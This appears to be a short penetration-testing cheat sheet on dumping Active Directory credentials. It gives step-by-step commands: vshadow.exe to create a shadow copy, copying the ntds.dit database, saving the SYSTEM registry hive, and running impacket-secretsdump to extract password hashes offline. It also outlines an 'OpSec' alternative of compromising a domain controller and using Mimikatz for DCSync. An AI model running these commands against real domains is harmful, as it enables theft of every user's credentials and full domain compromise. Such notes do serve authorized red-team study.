------------------------
- Shadow Copy, a.k.a. Volume Shadow Service (VSS), is a Microsoft backup technology that allows for creation of snapshots of files and volumes.
- Managed through vshadow.exe.
- As a domain admin one can extract the AD NTDS.dit database file and extract credentials offline.

### Extract ntds.dit AD Database:
1. As domain admin in elevated Powershell run:
```
vshadow.exe -nw -p  C:
```
2. Copy the extracted file to root folder:
```
copy <shadow-copy-device-name>\windows\ntds\ntds.dit c:\ntds.dit.bak
```
3. Save the SYSTEM hive from windows registry:
```
reg.exe save hklm\system c:\system.bak
```
4. Move the two files to Kali and use Impacket to extract credentials:
```
impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL
```

### Alternative OpSec Method:
1. Compromise DC.
2. Get Mimikatz to machine.
3. Dump hashes for all users individually through DCSync attacks.
